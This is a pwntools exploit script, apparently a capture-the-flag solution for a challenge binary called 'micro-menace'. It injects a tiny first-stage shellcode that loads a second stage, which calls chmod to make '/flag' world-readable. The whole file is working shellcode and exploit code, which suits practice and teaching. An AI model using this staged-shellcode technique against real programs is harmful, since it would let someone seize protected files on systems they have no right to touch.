#!/usr/bin/python3

from pwn import *
import time
#context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'error'
context.arch = "amd64"
elf = context.binary = ELF('/challenge/micro-menace')

#shellcode = open("shellcode_raw","rb").read()
shellcode = asm("""
xor edi, edi
xchg esi, edx
syscall 
""")
s2 = asm("""
nop
nop
nop
nop
nop
nop
mov rax, 90
lea rdi, [rip + flag]
mov rsi, 511
syscall
flag:
.string "/flag"
""")
io = process()

io.send(shellcode)
time.sleep(1)
io.send(s2)

io.interactive()
